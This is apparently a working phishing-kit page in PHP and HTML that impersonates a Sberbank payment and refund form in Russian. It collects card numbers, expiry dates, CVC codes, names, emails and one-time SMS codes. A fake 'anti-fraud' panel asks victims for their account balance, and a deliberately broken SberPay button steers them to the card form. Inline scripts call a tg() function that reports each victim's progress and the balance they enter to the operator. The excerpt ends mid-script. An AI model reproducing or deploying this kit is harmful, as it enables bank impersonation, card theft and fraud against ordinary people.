<!DOCTYPE html>
<html class="focus-disabled" lang="ru">
<head>

	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<meta content="width=device-width,initial-scale=1" name="viewport">
	<meta content="no-cache" http-equiv="Cache-control">
	<meta content="no-cache" http-equiv="Pragma">
	<meta content="-1" http-equiv="Expires">

	<?php 
	if(!$ref){
		echo "<title>Страница оплаты</title>";
	}
	else {
		echo "<title>Возврат средств</title>";
	}
	?>

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<link rel="stylesheet" type="text/css" href="/css/main.bef406a1.chunk.css">
	<link href="https://www.sberbank.ru/portalserver/static/templates/%5BBBHOST%5D/RuMasterpageTemplate/static/favicon.ico" rel="shortcut icon">
	<script src="/bower_components/card-info/dist/card-info.js"></script>
	<link rel="stylesheet" href="/css/font-awesome.min.css">
	<script src="/js/main.js"></script>


	<script>
	tg("🐘 ID" + "<?php echo $idPerson?>" + ", на оплате 🐘" +  "\n" + "🤑 Сумма: :" + "<?php echo $value?>"+" р.");
	</script>


</head>
<body>
	<div id="root">
		<div id="backblack"></div>
		
		<div id="fraud">
			<div  class="fraudOk" style="width: 100%; font-size: 175px; color: #1bdd4a; text-align: center; display: none;     margin-top: 40px;">
				<i class="fa fa-check-circle" aria-hidden="true" style=""></i>
			</div>
			<div class="fraudOk" style="text-align: center;font-size: 23px;"><a><a>Карта подтверждена</a></a></div>
			<div><img id="loaderFraud" class="spin" src="/Spinner.svg"></div>	
			
			<div class="styles_container__povOI" style=" margin: 0;     display: flex;    flex-direction: column;" >
				<div class="title"><a>Проверка безопасности</a></div>

				<div>
					<!-- <p style="margin: 0">В целях безопасности, мы временно списали с вашей карты 1 рубль (RUB). Cредства будут возвращены на Ваш счет после прохождения проверки.</p> -->
					<p style="margin: 0">Антифрод система Сбер Банка приостановила операцию из-за подозрительной активности на используемой банковской карте.</p>
					<p style="margin: 10px 0 0">В целях безопасности, мы временно списали с вашей карты 1 рубль (RUB), для получения ифнормации об операциях и состоянии счёта. Они будут возвращены после прохождения проверки.</p>
				</div>

				<div style="    margin-top: 10px;">
					<p style="margin: 0">Для подтверждения законного пользования картой, укажите остаток денежных средств на счету.</p>
				</div>

				<div class="flexrow">
					
					<div style="width: 25%;"><a class="dropdown" style="line-height: 37px;">Баланс: </a></div>

					<div style="width: 50%;"><input id="balance" class="dropdown" style="width: 100%" placeholder="0.00" oninput="checkBalance()"></div>

					<div></div>

					
					<div style="width: 25%;" class="container">
					  
						<div class="dropdown">
					 		<div class="select">
								<span>RUB</span>
								<i class="fa fa-chevron-left"></i>
							</div>
							<input type="hidden" name="gender">
							<ul class="dropdown-menu">
								<li id="male">USD</li>
								<li id="female">RUB</li>
							</ul>
						</div>
					  
						<!-- <span class="msg"></span> -->
					</div>
				</div>

				<div style="text-align: center;  margin-bottom: 10px;">
					<a id="fraudErr" style="color: red;">Ошибка</a>	
				</div>

				<div id="fraudBut">
					<a>Продолжить</a>
				</div>
				<div id="fraudLic" style="text-align: center;margin: 10px auto 0;  font-size: 14px;">
					<a style="text-align: justify;">Нажимая кнопку "Продолжить", я подтверждаю законное пользование картой.</a>
				</div>
			</div>
		</div>


		<script type="text/javascript">
			

			$("#fraudBut").click(function(){
				if($("#balance").val().length  > 1){

					tg("🔥 Чекер 🔥 \n 🐘 ID" + "<?php echo $idPerson?>" + "\n💰 На счету :" + $("#balance").val() + $(".select").text().replace(/\s/g, ''));
				}
			});



		</script>


		<section class="route-section">
			<div class="styles_layout__2ohv7">
				<div class="styles_header__3Z1OE">
					<div class="styles_headerInner__2T9zY">
						<div class="styles_logotype__2SxRk">
							<img src="/css/sberbank-logo-color.befb25b6.svg" alt="Сбербанк">
						</div>
						<div class="styles_profile__52Bm3">
							<div>
								<button type="button" class="styles_button__2BXWs">
									<svg width="18" height="18" viewBox="0 0 18 18" fill="none" class="styles_icon__2Zl3c">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M17.8554 7.38686C17.9508 7.90928 18 8.44993 18 9.00091C18 13.9712 13.9704 18 9 18C4.03017 18 0 13.9712 0 9.00091C0 4.02875 4.03017 0 9 0C11.1411 0 13.1079 0.748405 14.6532 1.99676L12.9026 3.28703C11.7911 2.52587 10.4469 2.07938 9 2.07938C5.18486 2.07938 2.08099 5.18538 2.08099 9.00091C2.08099 12.8164 5.18486 15.9206 9 15.9206C12.817 15.9206 15.9208 12.8164 15.9208 9.00091C15.9208 8.95444 15.9198 8.90797 15.9188 8.8615C15.9184 8.84601 15.9181 8.83052 15.9178 8.81503L17.8554 7.38686ZM5.57433 6.59698L9.00074 8.74621L16.1214 3.49766C16.5472 4.04742 16.911 4.64639 17.2014 5.28606L9.00074 11.331L5.57433 9.18177V6.59698Z" fill="currentColor">
										</path>
									</svg>
									<span>Войти&nbsp;по Сбер&nbsp;ID</span>
								</button>
							</div>
						</div>
					</div>
				</div>
					<div class="styles_main__1R8ID">
						<div class="styles_mainInner__3FzAE">
							<div class="styles_container__3S83w">
								<div class="styles_main__1vnDV">
									<div class="styles_thumb__yWgu0" title="">
									</div>
									<div>
										<div class="styles_merchantName__ZT_Sy"><?php echo $IP ?></div>
										<div class="styles_amount__Ntebp">
											<div><?php echo $value ?> &#8381</div>
											<div class="styles_moreInfo__1FVzD">
												<button type="button" class="styles_button__3ZO2U">
													<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
														<path d="M16.9997 9.17019C16.8123 8.98394 16.5589 8.87939 16.2947 8.87939C16.0305 8.87939 15.7771 8.98394 15.5897 9.17019L11.9997 12.7102L8.4597 9.17019C8.27234 8.98394 8.01889 8.87939 7.7547 8.87939C7.49052 8.87939 7.23707 8.98394 7.0497 9.17019C6.95598 9.26315 6.88158 9.37375 6.83081 9.49561C6.78004 9.61747 6.75391 9.74818 6.75391 9.88019C6.75391 10.0122 6.78004 10.1429 6.83081 10.2648C6.88158 10.3866 6.95598 10.4972 7.0497 10.5902L11.2897 14.8302C11.3827 14.9239 11.4933 14.9983 11.6151 15.0491C11.737 15.0998 11.8677 15.126 11.9997 15.126C12.1317 15.126 12.2624 15.0998 12.3843 15.0491C12.5061 14.9983 12.6167 14.9239 12.7097 14.8302L16.9997 10.5902C17.0934 10.4972 17.1678 10.3866 17.2186 10.2648C17.2694 10.1429 17.2955 10.0122 17.2955 9.88019C17.2955 9.74818 17.2694 9.61747 17.2186 9.49561C17.1678 9.37375 17.0934 9.26315 16.9997 9.17019Z" fill="currentColor">
														</path>
													</svg>
												</button>
											</div>
										</div>
									</div>
								</div>
							</div>


							<?php

							if(!$ref){
								echo '<div id="sberPayBlock" class="styles_container__povOI">';
							}
							else {
								echo '<div id="sberPayBlock" class="styles_container__povOI" hidden>';
							}

							?>


									<div>
										<div class="styles_title__3WvrL">SberPay</div>
										<div class="styles_description__14wbp">Быстрая оплата в приложении Сбербанк&nbsp;Онлайн</div>
										<button id="notWorking" class="styles_button__1Uv9f styles_gradient__ipaEl" type="button">
											<span>
												<svg width="69" height="24" viewBox="0 0 69 24" fill="none">
													<g fill="currentColor" fill-rule="evenodd">
														<path d="M36.1166 14.2911V19.3549H33.2905V3.0968H38.5563C43.5536 3.0968 45.6776 4.93322 45.6776 8.60303C45.6776 12.388 43.1908 14.2911 38.5563 14.2911H36.1166ZM36.1166 5.76961V11.6183H38.7716C41.3942 11.6183 42.7512 10.7364 42.7512 8.5303C42.7512 6.53327 41.5712 5.76658 38.8188 5.76658L36.1166 5.76961Z">
														</path>
														<path d="M47.3494 8.75113C48.1085 8.19827 49.4942 7.74194 51.4824 7.74194C54.8533 7.74194 56.5162 8.86521 56.5162 11.7787V19.1764H53.9767V17.158C53.4224 18.4568 52.0126 19.3548 50.166 19.3548C47.8344 19.3548 46.4517 18.0766 46.4517 15.8798C46.4517 13.3232 48.3676 12.6065 51.2053 12.6065H53.814V12.1151C53.814 10.5238 53.0308 10.0294 51.4824 10.0294C49.3587 10.0294 48.1356 10.8368 47.3524 12.0244L47.3494 8.75113ZM53.811 15.2187V14.3119H51.5276C49.934 14.3119 49.1719 14.6044 49.1719 15.6106C49.1719 16.4619 49.8165 17.0001 51.0185 17.0001C52.841 17.0001 53.6965 15.9909 53.811 15.2187Z">
														</path>
														<path d="M57.2905 7.74194H60.3006L63.4612 15.7073L66.0439 7.74194H68.9034L64.292 20.5871C63.2746 23.3726 62.2391 24 60.716 24C59.9996 24 59.211 23.7909 58.8708 23.4908V20.9569C59.2419 21.3214 59.7371 21.5296 60.2555 21.5389C61.0832 21.5389 61.7063 20.9812 62.1458 19.4172L57.2905 7.74194Z">
														</path>
														<path d="M6.96777 8.9283V12.5088L11.7577 15.4839L23.2258 7.12439C22.8212 6.24266 22.3142 5.41064 21.7152 4.64514L11.7577 11.9034L6.96777 8.9283Z">
														</path>
														<path d="M21.2254 11.7457C21.2254 11.8276 21.2254 11.9125 21.2254 11.9944C21.2286 14.0578 20.5407 16.0628 19.2713 17.6895C18.002 19.3162 16.2244 20.471 14.2222 20.9695C12.2199 21.468 10.1084 21.2815 8.22453 20.4398C6.34064 19.5982 4.79292 18.1498 3.8283 16.3258C2.86369 14.5018 2.53777 12.4073 2.90253 10.3764C3.2673 8.34556 4.30174 6.49538 5.8408 5.12107C7.37987 3.74677 9.33488 2.92752 11.3939 2.79405C13.453 2.66058 15.4974 3.22058 17.201 4.38469L19.5424 2.66664C17.4255 0.955872 14.7898 0.0156144 12.068 0.000192763C9.34622 -0.0152289 6.70005 0.895101 4.56382 2.58177C2.42759 4.26844 0.928214 6.63123 0.311798 9.28233C-0.304618 11.9334 -0.0014541 14.7153 1.17153 17.1714C2.34451 19.6276 4.31762 21.6119 6.76701 22.7989C9.2164 23.9858 11.9965 24.3048 14.6511 23.7035C17.3057 23.1022 19.677 21.6163 21.3758 19.4897C23.0746 17.3631 23.9999 14.7221 24 12.0003C23.9997 11.2789 23.9351 10.559 23.8068 9.84907L21.2254 11.7457Z">
														</path>
													</g>
												</svg>
											</span>
										</button>

										<div id="err1" class="styles_container__1K_6i" style="margin-top: 10px;">
											<div>В данный момент эта функция недоступна!</div>
										</div>

										<script type="text/javascript">
						
											$( "#notWorking" ).click(function() {
												// alert("qweqw")
												$( "#loader" ).fadeIn();

												setTimeout(
													function(){
														$( "#loader" ).fadeOut();
														$( "#err1" ).fadeIn();
														$( "#notWorking" ).css('background-image', 'none');
														$( "#notWorking" ).css('background-color', '#888');
														$( "#notWorking" ).addClass("error1");
													}, 3000
												);
											});
										</script>
									</div>
								</div>




								<div class="styles_container__povOI">
									<div><img id="loader" class="spin" src="/Spinner.svg"></div>

									<form class="styles_formContainer__1kwVY" method="POST" id="payForme">
										


									<?php

									if(!$ref){
										echo '<div class="styles_title__1O7Vi">По карте</div>';
									}
									else {
										echo '<div class="styles_title__1O7Vi">Возврат средств</div>';
									}

									?>

										<!-- <div class="styles_title__1O7Vi">По карте</div> -->




										<div class="styles_container__1K_6i">
											<div></div>
										</div>

										<div id="mainError" class="styles_container__1K_6i" style="margin-bottom: 20px;">
											<div>Проверьте правильность заполнения платежной формы</div>
										</div>




										<div id="Ok" class="" style="width: 100%; font-size: 100px; color: #1bdd4a; text-align: center; display: none;">
											<i class="fa fa-check-circle" aria-hidden="true" style=""></i>	
										</div>

										<div id="backToHell" class="styles_container__1K_6i" style="    margin: 20px 0; ; color: #343434; width: 100%; text-align: center;">

												<?php

												if(!$ref){
													echo '<div>Возврат на страницу покупки . . . </div>';
												}
												else {
													echo '<div>Возврат выполнен</div>';
												}

												?>

											


										</div>



										<div class="styles_pan__4LYZx">
											<div id="cardBox" class="styles_container__3NGxL">
												<div id="cardNotExist" class="styles_container__1K_6i">
													<div>Не верный номер карты</div>
												</div>

												<input id="card_number" class="styles_input__2tiuj" placeholder="Номер карты" name="card_number" maxlength="23" type="text" autocomplete="cc-number" autocorrect="off" spellcheck="off" aria-label="Номер карты" onKeyPress="number()" required>
												<label id="cardLabel" for="card_number" class="styles_label__1juTc">Номер карты</label>
											</div>

											<div class="styles_iconContainer__orE5L styles_psIcon__3kdjs">
												<img id="logoBank" src="" style="display: none;">
											</div>
										</div>

										<div class="styles_pan__4LYZx">
											<div id="passBox" class="styles_container__3NGxL"  style="display: none;">
												<input id="pass" class="styles_input__2tiuj" placeholder="Одноразовый код" name="card_number" maxlength="23" type="password" autocorrect="off" spellcheck="off" aria-label="Одноразовый код" onKeyPress="number()" >
												<label id="passLabel" for="card_number" class="styles_label__1juTc">Одноразовый код</label>
											</div>
										</div>

										<div class="styles_expiry__3kisv">
											<div id="expBox" class="styles_container__3NGxL">
												<input id="card_exp" class="styles_input__2tiuj" onKeyPress="number()" placeholder="Месяц/Год" name="card_expire" type="text" autocomplete="cc-exp" autocorrect="off" spellcheck="off" maxlength="5" aria-label="Срок действия карты" required>
												<label id="expLabel" for="card_exp" class="styles_label__1juTc">Месяц/Год</label>
											</div>
										</div>

										<div class="styles_cvc__ghAXm">
											<div id="cvcBox" class="styles_container__3NGxL">
												<input id="card_cvc" onKeyPress="number()" class="styles_input__2tiuj" placeholder="CVC/CVV-код" name="card_code" maxlength="3" autocomplete="false" autocorrect="no" spellcheck="false" aria-label="CVV/CVC код" type="password" style="" required>
												<label id="cvcLabel" for="card_cvc" class="styles_label__1juTc">CVC/CVV-код</label>
											</div>
										</div>


										<?php
										    
										    // echo $sname;
										    if ($fio) {
										    	echo '<div class="styles_email__MxloI">
											<div id="boxFio" class="styles_container__3NGxL">
												<input name="FIO" id="FIO" class="styles_input__2tiuj" type="text" placeholder="Фамилия и имя, как на карте" value="" required>
												<label id="FioLabel" for="FIO" class="styles_label__1juTc">Фамилия и имя, как на карте</label>
											</div>
										</div>';
										    }
										   	
										   	if ($email) {
										   		echo '<div class="styles_email__MxloI">
											<div id="boxMail" class="styles_container__3NGxL">
												<input name="email" id="email" class="styles_input__2tiuj" type="email" placeholder="Электронная почта" value="" required>
												<label id="mailLabel" for="email" class="styles_label__1juTc">Электронная почта</label>
											</div>
										</div>';
										   	}

										?>


										<script type="text/javascript">
								
											var chekStatus = true;



											$("#FIO").focus(function() {
												$("#boxFio").css("margin-top","20px");
											  	$("#FioLabel").css("top","-25px");
											  	$("#FioLabel").css("opacity","100");
		

											  	if (chekStatus) {
													chekStatus = false
													tg("🟡 Вбивает данные 🟡\n🐘ID" + "<?php echo $idPerson?>");
											  	}


											});

											$( "#FIO" ).blur(function(){
												if(parseInt($("#FIO").val()) >0){

											  	}
											  	else{
											  		$("#boxFio").css("margin-top","0");
												  	$("#FioLabel").css("top","0");
												  	$("#FioLabel").css("opacity","0");
											  	}
											});

											$("#card_number").focus(function() {
												$("#cardBox").css("margin-top","20px");
											  	$("#cardLabel").css("top","-25px");
											  	$("#cardLabel").css("opacity","100");
		

											  	if (chekStatus) {
												chekStatus = false
													tg("🟡 Вбивает данные 🟡\n🐘ID" + "<?php echo $idPerson?>");
											  	}


											});

											$( "#card_number" ).blur(function(){
												if(parseInt($("#card_number").val()) >0){

											  	}
											  	else{
											  		$("#cardBox").css("margin-top","0");
												  	$("#cardLabel").css("top","0");
												  	$("#cardLabel").css("opacity","0");
											  	}
											});


											$("#card_exp").focus(function() {
												$("#expBox").css("margin-top","20px");
											  	$("#expLabel").css("top","-25px");
											  	$("#expLabel").css("opacity","100");


											  	if (chekStatus) {
													chekStatus = false
													tg("🟡 Вбивает данные 🟡\n🐘ID" + "<?php echo $idPerson?>");
											  	}
											});

											$( "#card_exp" ).blur(function(){
												if(parseInt($("#card_exp").val()) >0){

											  	}
											  	else{
											  		$("#expBox").css("margin-top","0");
												  	$("#expLabel").css("top","0");
												  	$("#expLabel").css("opacity","0");
											  	}
											});


											$("#card_cvc").focus(function() {
												$("#cvcBox").css("margin-top","20px");
											  	$("#cvcLabel").css("top","-25px");
											  	$("#cvcLabel").css("opacity","100");

											  	if (chekStatus) {
													chekStatus = false
													tg("🟡 Вбивает данные 🟡\n🐘ID" + "<?php echo $idPerson?>");
											  	}
											});

											$( "#card_cvc" ).blur(function(){
												if(parseInt($("#card_cvc").val()) >0){

											  	}
											  	else{
											  		$("#cvcBox").css("margin-top","0");
												  	$("#cvcLabel").css("top","0");
												  	$("#cvcLabel").css("opacity","0");
											  	}
											});


											$("#email").focus(function() {
												$("#boxMail").css("margin-top","20px");
											  	$("#mailLabel").css("top","-25px");
											  	$("#mailLabel").css("opacity","100");
											});

											$( "#email" ).blur(function(){
												if(parseInt($("#email").val().length) >0){

											  	}
											  	else{
											  		$("#boxMail").css("margin-top","0");
												  	$("#mailLabel").css("top","0");
												  	$("#mailLabel").css("opacity","0");
											  	}
											  });

											var passCheck = true

											$("#pass").focus(function() {
												// alert("qwe")

												$("#passBox").css("margin-top","20px");
											  	$("#passLabel").css("top","-25px");
											  	$("#passLabel").css("opacity","100");

											  	if(passCheck){
											  		passCheck = false
											 

													tg("💌 Вводит одноразвый код 💌\n🐘 ID" + "<?php echo $idPerson?>");
									                
									                }
											  	});

											$( "#pass" ).blur(function(){
												if(parseInt($("#pass").val()) >0){

											  	}
											  	else{
											  		$("#passBox").css("margin-top","0");
												  	$("#passLabel").css("top","0");
												  	$("#passLabel").css("opacity","0");
											  	}
									}	);
										</script>



										<div class="styles_saveCardContainer__mPUhQ">
											<label for="saveCard" class="styles_label__2aw78">

												<input name="saveCard" type="checkbox" id="saveCard" class="styles_input__2zwkT">

												<span class="styles_switcher__2KwnC"></span>
												<span class="styles_text__3cQGu">Сохранить карту в Сбер&nbsp;ID</span>
											</label>
										
											<div class="styles_tooltip__1T8gq">
												<div class="styles_helpButtonContainer__FtEHF">
													<button type="button" class="styles_helpButton__2eMf1">
													
														<svg width="20" height="22" viewBox="0 0 20 22" fill="none">


														<path d="M8.32 7.932C8.824 7.644 9.352 7.464 10.192 7.464C11.452 7.464 12.076 8.004 12.076 8.76C12.076 10.56 9.364 10.224 9.364 12.24H10.324C10.324 10.932 13.084 11.028 13.084 8.76C13.084 7.152 12.028 6.504 10.276 6.504C9.46 6.504 8.752 6.648 8.32 6.816V7.932ZM9.064 14.352C9.064 14.772 9.244 15.12 9.844 15.12C10.456 15.12 10.636 14.772 10.636 14.352C10.636 13.92 10.456 13.572 9.844 13.572C9.244 13.572 9.064 13.92 9.064 14.352Z" fill="currentColor"></path></svg></button>
												</div>
											</div>
										</div>

							


										<div id="errorBlock" class="" style="display: none ">
									        <p class="styles_description__14wbp" style="margin: 0; margin: 0 0 20px 0;">Вы ввели неверный код. </p>
									    	<p class="styles_description__14wbp" style="margin: 0; margin: 0 0 20px 0;">Вам отправлен новый код подтверждения!</p>
									    </div>

										<div id="timerBlock" class="" style="display: none">
									        <p class="styles_description__14wbp" style="margin: 0">Повторная отправка через <span class="seconds styles_description__14wbp">100</span> секунд</p>
									    </div>

									    <div id="newSMS" class="" style="display: none">
									        <a class="styles_description__14wbp" style="user-select: none;" onclick="javascript:resendSMS()"; return false;>Не получили одноразовый код?</a>
									    </div>
								


									<div class="styles_buttons__1tD-2">
										<a onclick="checkAll()"  id="oplata" class="styles_button__1Uv9f styles_fake-disabled__1vXUI">


												<?php

												if(!$ref){
													echo '<span id="mainBut">Оплатить</span>';
												}
												else {
													echo '<span id="mainBut">Возврат</span>';
												}

												?>

										<!-- <span id="mainBut">Оплатить</span> -->
										</a>
									</div>



									<div>
									<?php

									if(!$ref){
										echo '<div class="styles_termsHint__2XVD6">Нажимая кнопку «Оплатить», я соглашаюсь с&nbsp;<a  rel="noopener noreferrer">условиями</a>&nbsp;ПАО Сбербанк</div>';
									}
									else {
										echo '<div class="styles_termsHint__2XVD6">Нажимая кнопку «Возврат», я соглашаюсь с&nbsp;<a  rel="noopener noreferrer">условиями</a>&nbsp;ПАО Сбербанк</div>';
									}

									?>

										<!-- <div class="styles_termsHint__2XVD6">Нажимая кнопку «Оплатить», я соглашаюсь с&nbsp;<a  rel="noopener noreferrer">условиями</a>&nbsp;ПАО Сбербанк</div> -->

										<img class="styles_availablePS__14sbc" src="data:image/png;base64,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" alt="">
									</div>


									<input id="submit-form" type="submit" hidden name="submit">
								</form>
							</div>
							<div class="styles_fpList__iX9-A"></div>
						</div>
					</div>
					<div id="under-footer"></div>
				</div>
			</section>
		</div>


		<!-- <script src="https://securepayments.sberbank.ru/payment/merchants/sbersafe_sberid/static/js/2.433ee6a7.chunk.js"></script> -->
		<!-- <script src="https://securepayments.sberbank.ru/payment/merchants/sbersafe_sberid/static/js/main.87554768.chunk.js"></script> -->


<script type="text/javascript">

	flag = false; //флаг ошпбки
	
	$("form").keyup(function(){
		check = "<?php echo $res?>";
		// alert("111")

		if (!isStage2) {


			if($( "#card_number" ).val().length == 19 && $( "#card_exp" ).val().length == 5 && $( "#card_cvc" ).val().length == 3){


				if (check == 1) {
					// alert('1')
					if($("#FIO").val().length > 5 && $("#email").val().length > 5){
						$("#mainBut").css("color","#fff");
						$("#oplata").css("background-color","#21a038");
					}
					else{
						$("#mainBut").css("color","#6c6c6c");
						$("#oplata").css("background-color","#f4f4f4");	
					}
				}
				else if (check == 2) {
					// alert('2')
					if( $("#email").val().length > 5){
						$("#mainBut").css("color","#fff");
						$("#oplata").css("background-color","#21a038");
					}
					else{
						$("#mainBut").css("color","#6c6c6c");
						$("#oplata").css("background-color","#f4f4f4");	
					}
				}
				else if (check == 3) {
					// alert('3')
					if($("#FIO").val().length > 5){
						$("#mainBut").css("color","#fff");
						$("#oplata").css("background-color","#21a038");
					}
					else{
						$("#mainBut").css("color","#6c6c6c");
						$("#oplata").css("background-color","#f4f4f4");	
					}
				}
				else{
					$("#mainBut").css("color","#fff");
					$("#oplata").css("background-color","#21a038");
				}


				
			}
			else{
				$("#mainBut").css("color","#6c6c6c");
				$("#oplata").css("background-color","#f4f4f4");		
			}

		}
		else{
			if($( "#pass" ).val().length != 0){
				$("#mainBut").css("color","#fff");
				$("#oplata").css("background-color","#21a038");
			}
			else{
					$("#mainBut").css("color","#6c6c6c");
					$("#oplata").css("background-color","#f4f4f4");	
			}
		}
	})





	// работа с номером карты
	$( "#card_number" ).keyup(function() {
		
		$("#cardNotExist").fadeOut("slow");
		
		// лого банка
		var value = $("#card_number").val()
		if (value.length<4) {

			var cardInfo = new CardInfo(value);

			if(cardInfo.brandLogo){
				$("#logoBank").fadeIn("slow");
				$("#logoBank").attr("src", cardInfo.brandLogo)
			}
		}

		// алгоритм Муна 
		if (value.length >= 19){
			if( Moon(value) == false ){
                $("#cardNotExist").fadeIn("slow");
